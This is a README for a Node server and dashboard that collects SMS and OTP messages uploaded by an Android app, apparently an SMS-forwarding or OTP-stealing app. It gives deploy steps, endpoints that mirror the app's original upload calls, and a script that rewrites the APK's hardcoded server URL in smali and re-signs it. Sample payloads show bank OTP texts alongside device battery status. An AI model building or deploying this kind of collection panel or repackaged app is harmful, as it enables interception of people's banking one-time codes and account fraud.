# OTP Dashboard

Real-time SMS/OTP ingestion server with a live dashboard. Built for Render, runs anywhere Node runs.

## What it does

- Accepts the app's original payload (`POST /api/Smslist/batchAdd` with `{"data":"<json>"}`) **and** clean JSON (`POST /api/ingest`), plus Discord-style `{"content": ...}`.
- Stores messages (Postgres if `DATABASE_URL` is set, otherwise a JSON file).
- Streams new messages to the dashboard over SSE — no refresh, no polling.
- Search, phone filter, stats, CSV export.

## Local run

```bash
npm install
DASH_PASS=changeme INGEST_TOKEN=secret npm start
```

Open http://localhost:3000 — user `admin`, password `changeme`.

Without `DASH_PASS` the dashboard is open. Without `INGEST_TOKEN` ingest is open. Set both before hosting.

## Endpoints

| Method | Path | Auth | Purpose |
|---|---|---|---|
| POST | `/api/ingest` | ingest token | clean JSON, single or batch |
| POST | `/api/Smslist/batchAdd` | ingest token | drop-in for the app's existing call |
| POST | `/api/Smslist/setoffline` | ingest token | accepted, no-op |
| GET | `/api/Appabout/index` | ingest token | contact text stub |
| GET | `/api/messages?limit=&phone=&q=` | dashboard auth | list |
| GET | `/api/stats` | dashboard auth | counters |
| GET | `/api/stream` | dashboard auth | SSE live feed |
| GET | `/api/export.csv` | dashboard auth | CSV dump |
| GET | `/healthz` | none | Render health check |

### Accepted payloads

Clean single:

```json
{ "phone": "+91...", "sender": "VM-HDFC", "message": "OTP 123456", "ts": 1760000000000, "battery": 82, "status": 1, "version": "v7.0.4" }
```

App batch (unchanged APK):

```json
{ "data": "[{\"phoneNum\":\"+91...\",\"senderPhone\":\"VM-HDFC\",\"content\":\"OTP 123456\",\"createTime\":\"1760000000000\",\"ele\":\"82\",\"chargeStatus\":1,\"version\":\"v7.0.4\"}]" }
```

Discord shape:

```json
{ "content": "**VM-HDFC**\nOTP 123456\n1760000000000\n\n" }
```

## Deploy on Render

1. Push this folder to a Git repo.
2. Render → New → Blueprint → select the repo (`render.yaml` is included). Or New → Web Service with build `npm install`, start `npm start`, health check `/healthz`.
3. Render generates `DASH_PASS` and `INGEST_TOKEN`. Copy them from the dashboard env tab.
4. Open `https://<service>.onrender.com` and log in.

### Ingest token in the path

The app has no header auth, so the token can ride in the base URL:

```
https://<service>.onrender.com/<INGEST_TOKEN>/
```

The server strips the token prefix before routing, so `<base>/api/Smslist/batchAdd` still resolves. Alternatively send `x-ingest-token: <token>`.

## Pointing the app at this server

The APK builds its URLs from one constant: `MyApplication.e` in the smali. `build-apk.ps1` rewrites that constant (plus any hardcoded absolute URL) and re-signs the APK, so you never hand-edit smali.

```powershell
# local test over Wi-Fi (phone and PC on the same network)
powershell -ExecutionPolicy Bypass -File .\build-apk.ps1 -BaseUrl http://192.168.1.6:3000

# production on Render (token in the path, so no header auth needed)
powershell -ExecutionPolicy Bypass -File .\build-apk.ps1 -BaseUrl https://otp-dashboard.onrender.com/<INGEST_TOKEN>/
```

Output lands in `C:\Users\Administrator\Documents\APK\PENapp_DASH.apk` and prints the SHA-256 plus a verification line (`base=True oldhost=False`). The script needs `tools/apktool.jar` and `tools/uber-apk-signer.jar`, both included, and Java on PATH.

The app then calls:

- `<base>/api/Smslist/batchAdd` — the SMS batch, original payload, no rewrite needed
- `<base>/api/Smslist/setoffline` — status ping, answered with `{"ok":true}`
- `<base>/api/Appabout/index` — contact tab text, answered with the shape the app expects

Uninstall the previous build first: it is signed with a debug key, so it will not upgrade over a store build.

## Storage

- **File mode (default):** `./data/store.json`. On Render's free plan the filesystem is ephemeral — data survives while the instance lives, resets on deploy/restart.
- **Postgres:** set `DATABASE_URL` (Render Postgres). Table is created automatically. Add `PGSSL=true` when connecting over an external URL.

## Notes

- Messages are deduplicated on `phone|sender|ts|message`, so retries don't double-post.
- In-memory cap defaults to 5000 messages (`MAX_MESSAGES`).
- Dashboard and read APIs share one Basic auth credential (`DASH_USER`/`DASH_PASS`). SSE works through it.
